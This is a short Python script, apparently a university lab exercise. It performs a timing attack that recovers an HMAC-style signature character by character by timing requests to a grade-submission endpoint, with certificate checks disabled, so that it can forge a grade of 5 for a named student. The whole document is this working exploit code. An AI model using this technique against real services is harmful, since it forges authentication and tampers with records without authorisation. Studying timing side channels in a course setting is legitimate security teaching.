
import timeit
import requests
import ssl
import urllib
"""
A timing attack on a webserver, gets the signature of a chosen target
"""
def webattack(name, grade):
    signa = list('xxxxxxxxxxxxxxxxxxxx')
    out = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name="
    out +=  name + "&grade=" + grade + "&signature="

    for j in range(20):
        oldT = 0
        val = 0

        for i in range(16):
            signa[j] = str(hex(i))[2:]
            newOut = out + "".join(signa)
            t = timeit.timeit(lambda : urllib.request.urlopen(newOut,
                    context = ssl._create_unverified_context()), number=10)

            if t > oldT:
                oldT = t
                val = str(hex(i))[2:]
        signa[j] = val
        print ("".join(signa))
    print ("final:", out + "".join(signa))

webattack("Kalle", "5")
